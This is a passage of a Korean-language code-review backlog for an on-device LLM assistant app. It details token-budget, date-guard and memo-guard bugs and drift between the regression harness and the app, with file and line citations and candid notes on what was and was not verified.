[못 읽은 것] USER_GUIDE.en.md, architecture.md 의 다른 ADR, 0.42.x 이전 계획서 대부분, 테스트 코드, ApprovalSheet, 영어 문자열, DataResetRepositoryImpl 본문. gradle·adb·실험은 규칙대로 돌리지 않았으므로 모델이 실제로 어떻게 답하는지(backlog-1 브리핑 글, backlog-4 '없어요' 답, backlog-8 '매일' 요청)는 코드 경로에서 추론한 것이다. 그래프 도구는 쓰지 않고 grep 으로 호출처를 확인했다. 시스템 알람이 강제 종료 때 지워지고 절전 중 setWindow 가 미뤄진다는 것은 안드로이드 플랫폼 동작에 대한 지식이며 이 기기에서 재지 않았다.
[이미 닫혀 있어 뺀 것] 초기화 뒤 예약 알림이 남는지(DataResetViewModel 이 지우기 전에 취소 — 0.42.10 확인과 일치), 할 일 빈 화면이 없는 기능을 권하던 문구(strings.xml:296 고쳐짐), 채팅으로 알림 목록 보기(0.32.0 보류 → 0.38.5 에 툴 추가됨), 0.42.5 가 '이미 고쳐짐'으로 대조한 항목들.
[10건을 넘겨 버린 것 — 9건] ① 위키 검색어에 개인 정보가 실릴 수 있는 경로(ADR-040 에 '기본 꺼짐·미측정'으로 이미 기록, 실사용 영향 낮음 — 같은 턴에 기억·문서 검색 결과가 들어온 뒤의 위키 호출을 앱이 막는 방안은 가능) ② hwp 읽기(unscheduled-hwp.md — 사용자 실파일 10개 대기 상태 그대로, 코드로 더 확인할 것 없음) ③ 정확 알람 권한 없을 때의 지연은 backlog-2 에 합침 ④ 위젯에서 할 수 있는 일이 앱 열기·음성 시작뿐(할 일 체크·목록 없음 — 취향·범위 문제라 뺌) ⑤ 시간대가 바뀌면 저장된 알림 시각 표기와 실제 울림이 어긋날 수 있음(드묾) ⑥ 영어 질문으로 한국어 문서 검색 실패(0.41.5 관찰, 0.42.5 에서 '뒤로'로 결정됨) ⑦ 위키 실패 결과에 오류 객체 원문이 실리는 것(SearchWikipediaToolExecutor.kt:58, 0.27.x 의 오래된 후보와 같은 종류, 모델 입력이라 실측 필요 — 영향 작음) ⑧ 추적되지 않는 scratch/lab/regression/last_run_019_off.json(.gitignore 는 last_run.json 만 가림 — 'git add -A' 때 주의)과 저장 안 한 gradle.properties 변경 ⑨ 두 주제가 섞인 대화 요약·은하 전환 끝 프레임·끝 시각 되묻기 흔들림(기록상 '한계' 또는 '바꾸지 않음'·'지켜볼 것'으로 사용자 결정이 끝난 것).
[경로] 저장소 루트는 C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday 이고, 줄 번호는 2026-11-20 현재 master(310ab4b) 기준이다.

</details>

## 프롬프트 표면·모델 행동 (prompt)

### prompt-1 · 한 번에 여러 툴을 실행할 때 용량 가드가 같은 차례의 앞 결과를 세지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 조회 툴 3개가 한 번에 나오면(예: '내일 일정이랑 알림 알려주고 와이파이 비번도 찾아줘') 세 호출 모두 같은 기준값으로 '500 더해도 된다'를 통과하고, 실제로는 최대 1,500토큰이 한꺼번에 들어간다. 대화가 예산 상한 근처면 2,800 + 1,500 = 4,300 으로 엔진 용량 4,096 을 넘는다. 휴대폰 런타임은 초과를 오류 없이 넘겨(04_MODEL_EVIDENCE '용량 이내에서만 유효') 깨진 답·숫자 왜곡으로만 나타나 원인 찾기가 어렵다. 0.42.7 에서 여러 호출 실행을 열면서 생긴 틈이고, 실사용에서 대화가 길어질수록 가까워진다.
- 제안: 반복문 안에서 이미 모은 결과의 크기를 더해 판정한다 — `currentKv + (앞 결과들의 추정 토큰 합 또는 results.size × TOOL_RESULT_MAX_TOKENS) + TOOL_RESULT_MAX_TOKENS <= 천장`. ToolKvBudget.fits 에 `pending` 인자를 추가하고 단위 테스트(3개 조회가 한 차례에 올 때 셋째에서 멈춤)를 더한다. TokenBudgetInvariantTest 122줄 주석도 '한 차례 3개 × 2차례'로 고친다. 모델 입력 문구는 그대로다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:201 — 둘째 호출부터 `ToolKvBudget.fits(modelRunner.currentKvTokens(), TOOL_RESULT_MAX_TOKENS, PREFILL_CEILING_TOKENS)` 로 검사하는데, 같은 차례의 앞 호출 결과는 아직 모델에 보내지 않은 상태라 currentKvTokens 가 그대로다
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:304-310 — 결과는 반복문이 끝난 뒤 combinedResults 로 한꺼번에 보낸다(최대 3개, 568줄 MAX_CALLS_PER_STEP = 3)
  - core/src/main/java/com/kosmos/app/core/common/Constants.kt:22,30,58,94 — 엔진 4096, 답 여유 768(천장 3328), 대화 예산 상한 2800, 툴 결과 하나 500
  - app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt:122 — 주석이 아직 '한 턴 툴은 최대 2개'라고 적혀 있다(0.42.7 이후 한 차례 3개 × 실행 2차례)
- 검증: 직접 확인. BaseAgent.kt:190 에서 한 차례 호출을 3개까지 자르고(568줄 MAX_CALLS_PER_STEP=3), 201줄 가드는 `ToolKvBudget.fits(modelRunner.currentKvTokens(), TOOL_RESULT_MAX_TOKENS, PREFILL_CEILING_TOKENS)` 로 매 호출 같은 값을 본다 — 결과는 반복문이 끝난 뒤 304~310줄에서 한꺼번에 보내므로 같은 차례 안에서는 KV 가 늘지 않는다. ToolKvBudget.kt 의 fits 는 `currentKv + resultCap <= ceiling` 뿐이고 대기 중 결과 인자가 없다. Constants.kt: 엔진 4096(22줄)·천장 3328(36줄)·예산 상한 2800(58줄)·결과 상한 500(94줄). 상한 2800 대화에서 조회 3개면 최악 4300 으로 엔진 용량 초과, 기본 예산 2500 에서도 2개면 3500 으로 천장(3328)을 넘어 답 여유를 깎는다. 다만 실제 결과는 대개 500 보다 훨씬 작고(쓰기 툴 성공 문구는 수십 토큰) 최악은 조회 툴(일정·기억·문서·위키) 여러 개가 한 차례에 나올 때만이다. TokenBudgetInvariantTest.kt:122 주석 '한 턴 툴은 최대 2개다'도 0.42.7 이후 사실과 다름을 확인. 제안(대기 결과 수 × 상한을 더해 판정)은 모델 입력을 건드리지 않아 타당.
- 앞선 기록: CHANGELOG 0.41.6 M2(390~394줄, 툴 반복 KV 가드) · architecture.md 1753줄(ADR-020 보충) · docs/plans/0.42.7-duplicate-write-and-loop-cap.md:13('KV 가드가 이미 막는다') — 같은 차례 안 누적은 기록 없음

### prompt-2 · 요일 가드가 '다음 주 수요일' 요청을 이번 주 날짜로 고치라고 안내한다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 월요일에 '다음 주 수요일 3시 회의 잡아줘'라고 했는데 모델이 날짜를 하루 틀리면(예: 화요일 날짜), 가드가 막으면서 '수요일은 (이번 주) 11일'이라고 알려 준다. 모델은 그 말을 따라 이번 주 수요일로 다시 부르고 승인 시트에 한 주 이른 날짜가 뜬다. 모델 실수를 막으려는 장치가 틀린 날짜를 확신 있게 불러 주는 셈이라, 사용자가 시트 날짜를 꼼꼼히 보지 않으면 일정이 한 주 앞에 들어간다. 면접에서 '가드가 오히려 오답을 만든 경우'로 지적받기 쉬운 자리다.
- 제안: 사용자 말에 `(다음|담)\s*주`·`next week` 가 있으면 안내 날짜를 '다음 주 월요일 + 요일 차이'로 계산하고, '다다음 주'·'이번 주 말고' 같은 표현이 있으면 날짜를 지어 안내하지 말고 통과시키거나 날짜를 묻게 한다. 안내 문장 틀은 그대로 두고 날짜 값만 바뀐다(문구 틀이 같아 토큰 수 변화 없음). 가드 판정식이 바뀌므로 run.py 의 weekday_mismatch_guidance 흉내도 같이 고치고 weekday 묶음에 '다음 주 X요일' 문항을 1~2개 더해 회귀 세트를 돌린다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntent.kt:87 — 안내 날짜가 항상 `today.with(TemporalAdjusters.nextOrSame(wanted))`(오늘 이후 가장 가까운 그 요일)이고 사용자 말의 '다음 주'·'next week' 는 보지 않는다
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntent.kt:62-75 — 요일이 다르면 곧바로 그 안내 문구('수요일은 11월 11일입니다. 그 날짜로 다시 추가하세요')를 돌려준다
  - domain/src/test/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntentTest.kt:34-41 — '다음 주 화요일'은 요일이 맞는 통과 경우만 시험한다(틀린 경우 없음)
  - app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:205-218 — 시스템 지시의 날짜 줄은 다가오는 엿새와 다음주 월요일만 준다. 다음 주 화~일은 모델이 직접 계산해야 해서 틀리기 쉬운 자리다
- 검증: 직접 확인. ScheduleWeekdayIntent.kt:69~75 는 요일이 다르면 곧장 formatGuidance 로 가고, 87줄 `today.with(TemporalAdjusters.nextOrSame(wanted))` 는 사용자 말의 '다음 주'·'next week' 를 전혀 보지 않는다. 따라서 '다음 주 수요일'에 모델이 요일을 틀리면 안내가 이번 주 수요일 날짜를 단정해 준다. ScheduleWeekdayIntentTest.kt:34~41 은 '다음 주 화요일'이 맞는 날짜로 온 통과 경우만 시험. PromptAssembler.kt 날짜 줄은 다가오는 엿새 + 다음주 월요일만 준다(200~218줄). 단서: 발동하려면 모델이 '다음 주 X요일'의 요일을 먼저 틀려야 하는데 그 빈도는 재지 않았고(CHANGELOG 323줄은 '다음 주 화요일은 묻고 안 넣음'), 승인 시트에 날짜가 보인다. '가장 가까운 요일' 자체는 계획서에 적힌 설계이므로, 고칠 범위는 '다음 주/다다음 주 낱말이 있을 때'로 좁히는 것이 맞다. 안내 문구 틀은 그대로라 토큰 변화 없음, run.py 의 weekday_mismatch_guidance 흉내 동시 수정 필요.
- 앞선 기록: docs/plans/0.41.13-weekday-guard-and-repeat-refusal.md:47('어느 주인지는 판정하지 않는다 … 안내 문구의 날짜는 오늘 이후 가장 가까운 그 요일') · architecture.md 2096줄(ADR-030 표) · CHANGELOG 0.41.13(285·290줄, nextOrSame) — '다음 주'라고 말했을 때 안내 날짜가 이번 주로 나가는 점은 기록 없음

### prompt-3 · '지금 ~ 일정 넣어줘'가 지난 시각 가드에 걸려 '내일 같은 시각인가요?'로 되묻게 된다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: '지금부터 1시간 운동 일정 넣어줘', '지금 회의 시작해, 일정에 넣어줘'처럼 지금을 시작 시각으로 삼는 요청은 몇 시 가드를 통과한 뒤 모델이 현재 시각(분 단위)을 넣는데, 그 값이 몇 초 차이로 '이미 지난 시각'이 되어 '오늘 10:53은 이미 지났습니다. 내일 10:53인지 물어보세요'가 모델에 돌아간다. 사용자는 엉뚱하게 '내일 10시 53분으로 잡을까요?'를 듣는다. 매일 쓰면서 일과를 기록하는 흐름에서 나올 수 있다.
- 제안: SchedulePastIntent 의 날짜 낱말 목록에 '지금'·'now'·'right now' 를 넣거나, 더 근본적으로 '지난 정도가 몇 분 이내(예: 5분)면 지난 것으로 보지 않는다'는 허용 폭을 둔다(둘 다 해도 된다). SchedulePastIntentTest 에 '지금 회의 시작' 문항을 더하고, run.py 의 past_guidance 흉내(PAST_DATE_WORD)를 같이 고친 뒤 clock 묶음을 돌린다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/agent/SchedulePastIntent.kt:19-23 — 날짜 낱말 목록에 오늘·어제·아까·방금·내일… 은 있지만 '지금'·'now' 가 없다
  - domain/src/main/java/com/kosmos/app/domain/agent/SchedulePastIntent.kt:36 — `start >= now` 가 아니고 날짜 낱말이 없으면 막는다. 모델이 턴 리마인더의 `[Now] HH:mm` 을 그대로 쓰면 start 는 그 분의 0초라 거의 항상 now 보다 작다
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:14-21, 27-30 — 같은 '지금'·'now' 를 몇 시 가드는 '시각이 있다'로 인정한다(두 가드의 낱말 목록이 서로 다르다)
  - domain/src/test/java/com/kosmos/app/domain/agent/SchedulePastIntentTest.kt:42-49 — 통과 경우에 '지금' 문항이 없다
- 검증: 직접 확인. SchedulePastIntent.kt:19~23 의 날짜 낱말 목록에 오늘·어제·아까·방금·내일 등은 있지만 '지금'·'now' 가 없고, 36줄은 `start >= now` 가 아니면서 날짜 낱말이 없으면 막는다. 반면 ScheduleTimeIntent.kt:16·28~29 는 '지금'·'now' 를 날짜·시각 낱말이자 시계 시각으로 인정하므로 앞의 두 가드는 통과한다(ToolCallGuards.kt:67~83 순서 확인). 턴 리마인더가 `[Now] HH:mm`(분 단위, PromptAssembler.kt:103)이라 모델이 그 값을 시작 시각으로 쓰면 0초 기준이 되어 거의 항상 now 보다 작다 → '오늘 HH:mm 은 이미 지났습니다. 내일 …인지 물어보세요'. SchedulePastIntentTest.kt:42~49 통과 경우에 '지금' 문항 없음. 단서: 모델이 실제로 [Now] 값을 그대로 넣는지는 측정 기록이 없어(코드 경로만 확인) 빈도는 추정이고, 결과는 한 턴 엉뚱한 되묻기라 심각도는 낮게 본다. 날짜 낱말에 '지금/now' 추가 또는 몇 분 허용 폭 모두 모델 입력 불변.
- 앞선 기록: CHANGELOG 0.42.5 M1(103줄, 지난 시각 가드 exp99) · 0.42.7(날짜 낱말에 내일·요일·다음 주 보강) — '지금'은 기록 없음

### prompt-4 · '저장해 둔/메모해 둔 ○○ 뭐였지?' 꼴의 조회 질문은 메모 저장을 막는 두 가드를 모두 통과한다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 메모 앱에서 가장 자연스러운 조회 말투가 '내가 저장해 둔 ○○ 뭐였지', '메모해 둔 주소 다시 알려줘'다. 프롬프트로는 못 고쳐 가드로 막은 문제(되묻기에 저장 호출, exp61 에서 2~3/6)인데 바로 이 말투만 두 가드의 예외 조건에 동시에 걸려 빠진다. 모델이 저장을 부르면 조회하려던 사용자에게 저장 승인 시트가 뜨고, 취소하면 값 대신 '메모에는 남기지 않았어요.'로 끝난다. 실제 빈도는 실험실에서 재 보지 않았다(코드로 확인한 것은 가드가 통과시킨다는 점까지).
- 제안: 저장 낱말이 꾸미는 꼴('저장해 둔|저장한|저장된|메모해 둔|메모한|기억해 둔|적어 둔|알려준')로 쓰이고 문장이 질문(뭐였·어디·몇·언제·알려줘·?)이면 저장 부탁으로 보지 않도록 RepeatRequest.SAVE 와 MemoSaveIntent.hasSaveWord 에 한국어 조회 예외를 둔다(영어 REMEMBER_LOOKUP_EN 과 같은 결). 단위 테스트와 run.py 흉내(REPEAT_SAVE·SAVE_WORD_KO)를 같이 고치고, repeat 묶음에 이 말투 2~3문항을 더해 먼저 지금 상태의 실패 빈도를 잰 뒤 반영한다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/memory/RepeatRequest.kt:15-21 — 되묻기 판정은 '저장 낱말(기억해|저장|메모해…)이 없을 때만' 참이다. '저장해 둔 와이파이 비번 뭐였지?'는 '저장'이 들어 있어 되묻기가 아닌 것으로 본다
  - domain/src/main/java/com/kosmos/app/domain/memory/MemoSaveIntent.kt:15, 71-76 — 한국어 저장 낱말은 '기억|저장|메모' 글자만 있으면 저장 부탁으로 본다(영어는 조회 의문문을 따로 빼지만 한국어에는 그 처리가 없다)
  - app/src/main/java/com/kosmos/app/assistant/agent/ToolCallGuards.kt:56-63 — 두 판정이 모두 통과면 add_memory 가 승인 시트까지 간다
  - scratch/lab/regression/run.py:204-205, 252 — repeat 묶음 4문항과 RECALL_WORD 2문항('기억나?')에 '저장해 둔/메모해 둔 … 뭐였지' 꼴이 없다. 기준값에서 repeat 는 이미 3/4(baseline.json)
- 검증: 직접 확인. RepeatRequest.kt:15~21 의 matches 는 되묻기 낱말이 있어도 SAVE('기억해|저장|메모해…')가 있으면 거짓이라 '저장해 둔 와이파이 비번 뭐였지?'는 되묻기로 안 본다. MemoSaveIntent.kt:15 SAVE_WORD_KO 는 '기억|저장|메모' 글자만으로 참이고 71~76줄 hasSaveWord 는 한국어 일치 시 즉시 true(영어의 REMEMBER_LOOKUP_EN 같은 조회 예외가 한국어에는 없음). ToolCallGuards.kt:56~63 에서 두 가드 모두 통과 → add_memory 가 승인 시트까지 간다. 단위 테스트·run.py 에 이 말투 문항 없음(grep '저장해 둔|메모해 둔' 0건, MemoSaveIntentTest.kt:70 은 답 문장 쪽). 단서: '낱말을 넓게 잡는다'는 일부러 한 결정이고(놓치면 한 번 더 물을 뿐이라는 근거), 이 말투에서 모델이 실제로 search_memory 대신 add_memory 를 부르는 빈도는 재지 않았다 — 시스템 지시에 '뭐였지 → search_memory, never add_memory' 줄(PromptAssembler.kt:262~264)이 있어 대부분은 조회로 갈 가능성이 크다. 가드 빈틈 자체는 사실이나 심각도는 낮게, 제안대로 먼저 실패 빈도를 잰 뒤 반영이 맞다.
- 앞선 기록: CHANGELOG 0.38.9(사실 저장 가드 — 저장 낱말을 넓게 잡는다는 결정, MemoSaveIntent KDoc 에도 명시) · 0.40.0 M2a(영어만 조회 의문문 제외) · 0.39.2(overlap 묶음 '저장 낱말 든 물음') — 한국어 '저장해 둔 … 뭐였지' 꼴은 기록 없음

### prompt-5 · 회귀 세트가 가드 정규식과 툴 결과 문구를 손으로 베껴 쓰고 있고, 이미 앱과 어긋난 곳이 있다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 이 저장소는 시스템 지시를 손으로 베끼다 실험이 앱과 다른 것을 잰 경험 때문에 PromptFixtureExportTest 를 만들었다. 그런데 가드 판정식과 툴 결과 문구는 여전히 사본이고, 0.41.6 에서 '앱과 같음을 확인'했다고 적은 뒤에도 위 차이가 남아 있다. 0.42.7 에서는 실험실 흉내가 앱과 달라(인자 이름) 가드가 휴대폰에서 한 번도 안 돈 것을 못 잡았다. 회귀 세트는 모델 입력을 바꿀 때마다 기대는 유일한 안전망이라, 흉내가 어긋나면 '기준과 같음'이 앱의 실제 동작을 보증하지 못한다. 포트폴리오에서도 '회귀 세트가 앱과 같은 것을 재는가'는 바로 나올 질문이다.
- 제안: PromptFixtureExportTest 와 같은 방식으로 JVM 테스트 하나가 가드 정규식 원문(Regex.pattern)과 고정 문구(REPEAT_NOT_SAVE·ASK_FIRST·NO_TIME·NO_CLOCK·HIT_TAIL·CURRENT_FIRST_GUIDE·툴 성공 문구 등)를 `scratch/lab/fixtures/guards.json` 으로 내보내고, run.py 는 그 파일을 읽어 re.compile 한다(코틀린 정규식 문법은 지금 쓰는 범위에서 파이썬과 호환). 당장은 위에 적은 네 곳의 차이를 앱에 맞추고, 실행 차례 수도 앱과 같게(2차례) 맞춘 뒤 세트를 한 번 돌려 기준과의 차이를 CHANGELOG 에 적는다. 앱의 모델 입력은 바뀌지 않는다.
- 근거:
  - scratch/lab/regression/run.py:367 — 알림 등록 성공 문구가 `리마인더 등록: '내용' 알림` 인데 앱은 `리마인더 등록: {표시 시각}에 '내용' 알림`(app/src/main/java/com/kosmos/app/assistant/tool/AddReminderToolExecutor.kt:86)
  - scratch/lab/regression/run.py:685 — 영어 일정 성공 문구 `Event added.` vs 앱 `Event added successfully.`(AddScheduleToolExecutor.kt:68)
  - scratch/lab/regression/run.py:202 — 영어 거절 판정의 뒤보기 `(?![^.!?\n]{0,40}…` vs 앱 `(?![^.!\n]{0,40}…`(domain/src/main/java/com/kosmos/app/domain/agent/RefusalTurns.kt:20) — 물음표 처리 다름
  - scratch/lab/regression/run.py:369, 687 — 일정 조회·알림 목록(영어는 기억 검색·알림 등록까지) 결과가 앱 문구가 아닌 `없음`/`None` 한 낱말
  - scratch/lab/regression/run.py:41-68, 149-214 — 문구 상수 약 10개와 정규식 약 15개가 '원문: … 바뀌면 같이'라는 주석과 함께 손으로 복사돼 있다
  - scratch/lab/regression/run.py:335, 660 — 툴 실행을 3차례까지 돌리지만 앱은 3번째 생성에서 툴이 나오면 오류로 끝낸다(BaseAgent.kt:165, MAX_TOOL_LOOP_COUNT 3 = 실행 2차례)
- 검증: 직접 대조. (1) run.py:367 `리마인더 등록: '{content}' 알림` vs AddReminderToolExecutor.kt:86 `리마인더 등록: ${displayTime}에 '${content}' 알림` — 다름. (2) run.py:685 `Event added.` vs AddScheduleToolExecutor.kt:68 `Event added successfully.` — 다름. (3) run.py:202 영어 거절 뒤보기 `[^.!?\n]{0,40}` vs RefusalTurns.kt:20 `[^.!\n]{0,40}` — 물음표 처리 다름. (4) run.py:369·687 나머지 툴 결과가 `없음`/`None` 한 낱말(영어 흉내는 search_memory·add_reminder 분기 자체가 없음, 664~687줄). (5) run.py:335·660 `for _ in range(3)` 은 3번째 생성의 호출까지 실행하지만 앱은 loopCount 가 3 이 된 생성에서 툴이 나오면 오류로 끝낸다(BaseAgent.kt:83·103·165, MAX_TOOL_LOOP_COUNT=3 → 실행 2차례). 정규식·문구가 '원문: … 바뀌면 같이' 주석과 함께 손 복사돼 있음도 확인(run.py:41~68, 149~214). 한국어 쪽 정규식(SCHEDULE_TIME·CLOCK·REPEAT·SAVE_WORD·YES)은 지금 앱과 글자가 같다. 회귀 세트는 '일회용 실험 스크립트' 결정의 명시적 예외(AGENTS §2-⑤)라 고칠 대상이 맞다. 주의: 흉내를 앱에 맞추면 기준값이 움직일 수 있어 기준 저장은 결과 확인 뒤(사용자 결정).
- 앞선 기록: CHANGELOG 0.41.6 M5(398줄 '미러 수정 뒤') · CHANGELOG 0.42.7(59줄, 흉내와 앱이 달라 가드 미동작을 못 잡음) · AGENTS §2-⑤(판정식을 바꾸면 흉내도 같이)

### prompt-6 · 회귀 세트가 문서 검색 켜짐·한 번에 여러 호출·응답 길이 설정·프로필이 있는 상태를 전혀 재지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 0.42.9 에서 18토큰짜리 한 줄이 무관해 보이던 묶음 두 개를 깨뜨렸듯, 이 모델은 지시가 조금만 바뀌어도 다른 행동이 흔들린다. 그런데 사용자가 실제로 켜고 쓰는 문서 검색(선언 + 강한 트리거 줄이 붙는 가장 큰 변형), 0.42.7 에서 고친 여러 호출 실행, 프로필이 있는 평소 상태는 회귀 세트 밖이라 다음에 시스템 지시를 손볼 때 깨져도 '새로 깨진 것 0'으로 나온다. 다음 후보로 적어 둔 '할 일 툴 추가'가 바로 그런 변경이다.
- 제안: run.py 에 묶음 세 개를 더한다(문항 수는 작게). ① docsearch: 켜짐 픽스처 + DOC_TOOLS 로 규정 질문 3개는 search_documents, 일상 질문·일정·메모 3개는 원래 툴(또는 무호출), 그리고 문서 첨부 턴 1~2개(첨부 문서로 답하는지). ② multi: '치과 3시, 팀 미팅 5시 둘 다 잡아줘' 등 exp103 문항 3개를 옮겨 두 호출이 모두 나오는지. ③ profile/style: PromptFixtureExportTest 가 프로필 채움·간결·자세히 변형 픽스처를 추가로 내보내고 smoke 를 그 지시로 한 번 더. 기준값 저장은 결과를 사람이 확인한 뒤에(사용자 결정 유지). 앱의 모델 입력은 바뀌지 않는다.
- 근거:
  - scratch/lab/kosmos_lab.py:121-123 — 문서 검색용 툴 목록 DOC_TOOLS 가 있지만 scratch/lab/regression/run.py 어디에서도 쓰지 않는다(grep 'DOC_TOOLS|docsearch' 결과 0건). 픽스처 system_instruction_docsearch.txt 도 세트가 읽지 않는다
  - scratch/lab/regression/run.py:853-854 — 묶음 17개 중 '둘 다 잡아줘'처럼 한 번에 여러 호출을 내는 문항이 없다(0.42.7 의 exp101~103 은 일회용 스크립트)
  - app/src/test/java/com/kosmos/app/assistant/context/PromptFixtureExportTest.kt:55, 92, 126 — 픽스처는 응답 길이 '기본', 프로필 없음 조건만 내보낸다
  - app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:117-120, 129-131 — 문서 검색이 켜지면 시스템 지시는 '먼저 search_documents 를 부르고 그 결과로만 답하라', 문서를 첨부한 턴의 리마인더는 '툴 없이 문서에서 답하라'로 서로 반대 지시가 함께 들어간다. 이 조합을 잰 기록을 찾지 못했다
  - scratch/lab/regression/run.py:709-724, 730-742 — 영어는 툴 선택 12문항 + 가드 4문항뿐이고 거절 따라 하기·되묻기·새 값·지난 시각 묶음은 한국어만
- 검증: 직접 확인. grep 결과 DOC_TOOLS 는 scratch/lab/kosmos_lab.py:121~123 에만 있고 run.py 에는 'DOC_TOOLS|docsearch' 0건 — 픽스처 system_instruction_docsearch.txt 는 존재하지만 세트가 읽지 않는다. run.py:853~854 묶음 17개(smoke·save·fact·yes·drift·why·newval·repeat·iso·overlap·optional·smoke_en·guard_en·weekday·clock·inject·remind_mem)에 한 번에 여러 호출을 기대하는 묶음이 없다(턴 함수는 여러 호출 실행을 흉내 내지만 문항이 없음). PromptFixtureExportTest.kt:55·92·126·147 은 responseStyle="DEFAULT" 만 내보내고 프로필은 154줄 단위 단언용 한 건뿐. PromptAssembler.kt:117~120(문서 검색 켜짐 트리거: 먼저 search_documents)과 129~131(문서 첨부 턴 리마인더: 툴 없이 문서에서)이 동시에 들어갈 수 있는 구조도 확인(리마인더 교체는 98~104줄, 시스템 지시는 그대로). 이 조합의 측정 기록은 내가 본 범위(CHANGELOG grep)에서 못 찾았으나 전수 확인은 아님. 영어 묶음이 smoke_en·guard_en 뿐인 것도 SETS 에서 확인. 제안은 앱의 모델 입력을 바꾸지 않는다.
- 앞선 기록: CHANGELOG 0.41.2(457줄 '꺼짐 지시는 바이트 불변' — 켜짐은 별도 픽스처) · CHANGELOG 0.42.7(exp101~103 일회용) · CHANGELOG 0.42.9(28줄, 한 줄이 clock·inject 를 흔듦) · CHANGELOG 7줄(다음 후보 '할 일 툴 — 회귀 세트 실측 선행')

### prompt-7 · 일정 가드의 낱말 목록이 영어와 한글 수 표현에서 어긋난다 — 'at 3'은 시각이 없다고 막고 'I am'은 시각으로 본다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 영어 모드(0.40.0 부터 지원)에서 'Add lunch with Sam tomorrow at 12'처럼 am/pm 없이 말하는 것이 보통인데, 모델이 바르게 일정을 불러도 가드가 막고 '몇 시에 잡을까요?'를 다시 묻게 한다. 반대로 'I am …'으로 시작하는 사실 문장에 모델이 일정을 잘못 부르면 '일정 요청이 아니다 → 메모할지 물어라'가 아니라 '몇 시인지 물어라'가 돌아가 엉뚱한 질문이 나온다. 한국어 '한 시간 뒤에 회의 잡아줘'도 한 번 더 묻게 된다. 한 턴 더 드는 정도라 심각하지는 않지만 한/영 비대칭으로 지적받을 자리다.
- 제안: CLOCK 에 `\bat\s+\d{1,2}\b(?!\s*(st|nd|rd|th))`, 영어 수 낱말 + (am|pm|o'clock), 'half past', '(한|두|세|반)\s*시간\s*(뒤|후)', '(십|이십|삼십|사십|오십)\s*분\s*(뒤|후)' 를 더하고, TIME_WORDS 의 단독 `am` 은 빼고 숫자 뒤 am/pm 만 남긴다(`\d+\s*(am|pm)` 은 이미 있다). ScheduleTimeIntentTest 에 위 문장들을 더하고 run.py 흉내(SCHEDULE_TIME·SCHEDULE_CLOCK)를 같이 고친 뒤 clock·guard_en·smoke_en 을 돌린다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:27-30 — 몇 시 판정(CLOCK)의 영어는 숫자+am/pm, HH:MM, noon/midnight/now, o'clock, 'in N minutes' 뿐이다. 'tomorrow at 3', 'at three', 'half past two', '3 in the afternoon' 은 시각이 없는 것으로 본다
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:18-19 — 날짜·시각 낱말(TIME_WORDS)에 단독 낱말 `am`·`now`·`night`·`morning` 이 있어 'I am allergic to peanuts' 같은 사실 문장이 '날짜·시각 있음'으로 통과한다
  - domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:28 — 'N분/N시간 뒤'는 숫자만 받는다. '한 시간 뒤', '삼십 분 뒤'는 TIME_WORDS(15줄 '한\s*시')에는 걸리고 CLOCK 에는 안 걸려 '몇 시인지 물어보세요'로 막힌다
  - scratch/lab/regression/run.py:787-791, 734-735 — clock 묶음의 영어 문항은 '3pm' 하나, 영어 사실 문항 둘에는 'I am' 이 없다
- 검증: 직접 확인. ScheduleTimeIntent.kt:27~30 CLOCK 의 영어는 숫자+am/pm, HH:MM, noon/midnight/now, o'clock, 'in N minutes/hours' 뿐이라 'tomorrow at 3'·'half past two' 는 hasClock 거짓 → needsClock(46줄) 참 → NO_CLOCK 으로 막힌다. 14~21줄 TIME_WORDS 에 단독 `\b(…|now|am|pm|…)\b` 가 있어 'I am allergic to peanuts' 는 hasTime 참 → '일정 요청이 아니다' 대신 '몇 시인지 물어라'가 돌아간다. '한 시간 뒤'는 TIME_WORDS 의 `한\s*시` 에 걸리고 CLOCK 에서는 `(?!간)` 과 숫자 전용 `\d+\s*(분|시간)\s*(뒤|후)` 때문에 빠져 NO_CLOCK. 후보의 작은 오류: '삼십 분 뒤'는 TIME_WORDS 에도 안 걸리므로(숫자 없는 한글 수 + 분) NO_CLOCK 이 아니라 NO_TIME('메모해 둘까요?' 유도)으로 막힌다 — 결론은 같지만 더 엉뚱한 안내다. 영향은 한 턴 더 묻는 정도, 영어는 보조 언어라는 기록(CHANGELOG 587줄)이 있어 심각도 낮음. 단독 `am` 을 빼는 변경은 'I am' 오탐을 줄이지만 'at 3 pm' 처럼 띄어 쓴 경우는 `\d+\s*(am|pm)` 이 이미 잡는다. run.py:46~59 흉내가 지금 앱과 글자가 같으므로 함께 고쳐야 한다.
- 앞선 기록: CHANGELOG 0.41.11 M1(315줄 일정 가드) · 0.41.15 M2(몇 시 가드 exp92) · 0.42.2(가드 빈틈 보강) — 영어 'at 3'·단독 'am', 한글 수 '한 시간 뒤'는 기록 없음

### prompt-8 · 예산 불변식의 실측값이 응답 길이 '간결'·'자세히' 설정에서 붙는 지시 한 줄을 포함하지 않는다(여유 20토큰과 같은 크기)
- 판정 확인됨 · 중요도 낮음 · 크기 S
